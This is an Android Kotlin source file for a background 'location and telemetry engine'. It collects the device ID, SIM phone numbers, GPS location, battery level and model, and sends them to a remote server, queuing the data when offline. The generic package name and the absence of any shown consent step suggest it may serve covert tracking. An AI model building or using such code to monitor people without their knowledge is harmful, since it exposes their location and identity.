/**
 * EXSUNG SYSTEM COMPONENT: Background Location & Telemetry Engine (Sync App)
 * Refer to Master Architecture Plan: d:/Desktop/Experiments/Exsung/PLAN.md
 * Any structural changes to configuration or endpoints MUST be updated in PLAN.md
 */

package com.system.core

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import com.google.android.gms.location.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.IOException

class LocationEngine(private val context: Context) {

    private val httpClient = OkHttpClient()
    private val fusedLocationClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context)
    private val offlineQueueFile = File(context.filesDir, "offline_pings.json")

    fun getDeviceId(): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN_DEVICE"
    }

    @SuppressLint("MissingPermission")
    fun getSimPhoneNumbers(): JSONArray {
        val jsonArray = JSONArray()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val activeSubs = subManager?.activeSubscriptionInfoList
                if (activeSubs != null) {
                    for (sub in activeSubs) {
                        var number: String? = null
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            number = subManager.getPhoneNumber(sub.subscriptionId)
                        } else {
                            @Suppress("DEPRECATION")
                            number = sub.number
                        }
                        if (!number.isNullOrEmpty()) {
                            jsonArray.put(CryptoUtils.encryptText(number))
                        }
                    }
                }
            }
            if (jsonArray.length() == 0) {
                val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                val line1Number = telephonyManager?.line1Number
                if (!line1Number.isNullOrEmpty()) {
                    jsonArray.put(CryptoUtils.encryptText(line1Number))
                }
            }
        } catch (e: Exception) {
            Log.e("ExsungLocationEngine", "SIM Number Extraction Error: ${e.message}")
        }
        return jsonArray
    }

    @SuppressLint("MissingPermission")
    fun sendTelemetryPing() {
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        val gpsStatusStr = if (isGpsEnabled) "ON" else "OFF"

        if (!isGpsEnabled) {
            // When GPS is OFF: Send ping to update devices.gps_status = 'OFF' WITHOUT location coordinates
            postTelemetryPayload(0.0, 0.0, 0.0f, gpsStatusStr)
            return
        }

        fusedLocationClient.lastLocation.addOnSuccessListener { location: Location? ->
            val finalLoc = location 
                ?: locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)

            if (finalLoc != null) {
                postTelemetryPayload(finalLoc.latitude, finalLoc.longitude, finalLoc.accuracy, "ON")
            } else {
                postTelemetryPayload(0.0, 0.0, 0.0f, "ON")
            }
        }.addOnFailureListener {
            postTelemetryPayload(0.0, 0.0, 0.0f, "OFF")
        }
    }

    private fun postTelemetryPayload(lat: Double, lng: Double, accuracy: Float, gpsStatus: String) {
        val deviceId = getDeviceId()
        val rawModelName = "${Build.MANUFACTURER} ${Build.MODEL}"
        val encModelName = CryptoUtils.encryptText(rawModelName)

        // Read Live Battery Percentage
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
        val batteryPct = batteryManager?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100

        // Read SIM Numbers
        val simNumbers = getSimPhoneNumbers()

        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("name", encModelName)
            put("gps_status", gpsStatus)
            put("battery_percentage", batteryPct)
            if (simNumbers.length() > 0) {
                put("phone_numbers", simNumbers)
            }
            if (gpsStatus == "ON") {
                put("latitude", lat)
                put("longitude", lng)
                put("accuracy", accuracy)
            }
        }

        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        val request = Request.Builder()
            .url("${AppConfig.SERVER_BASE_URL}/api/telemetry")
            .post(requestBody)
            .build()

        httpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("ExsungLocationEngine", "Telemetry Ping Failed: ${e.message}")
                saveOfflinePing(json)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("ExsungLocationEngine", "Telemetry Ping Sent Successfully (GPS Status: $gpsStatus)")
                    flushOfflinePings()
                } else {
                    saveOfflinePing(json)
                }
            }
        })
    }

    private fun saveOfflinePing(json: JSONObject) {
        synchronized(this) {
            try {
                val array = if (offlineQueueFile.exists() && offlineQueueFile.readText().isNotBlank()) {
                    JSONArray(offlineQueueFile.readText())
                } else {
                    JSONArray()
                }
                json.put("timestamp", System.currentTimeMillis())
                array.put(json)
                offlineQueueFile.writeText(array.toString())
                Log.d("ExsungLocationEngine", "Queued offline ping locally. Total queued: ${array.length()}")
            } catch (e: Exception) {
                Log.e("ExsungLocationEngine", "Failed to queue offline ping: ${e.message}")
            }
        }
    }

    private fun flushOfflinePings() {
        synchronized(this) {
            try {
                if (!offlineQueueFile.exists()) return
                val content = offlineQueueFile.readText()
                if (content.isBlank()) return
                val array = JSONArray(content)
                if (array.length() == 0) return

                val batchJson = JSONObject().apply {
                    put("device_id", getDeviceId())
                    put("pings", array)
                }

                val requestBody = batchJson.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
                val request = Request.Builder()
                    .url("${AppConfig.SERVER_BASE_URL}/api/telemetry/batch")
                    .post(requestBody)
                    .build()

                httpClient.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        Log.e("ExsungLocationEngine", "Batch Upload Failed: ${e.message}")
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            Log.d("ExsungLocationEngine", "Successfully uploaded ${array.length()} offline pings!")
                            offlineQueueFile.delete()
                        }
                    }
                })
            } catch (e: Exception) {
                Log.e("ExsungLocationEngine", "Failed to flush offline pings: ${e.message}")
            }
        }
    }
}
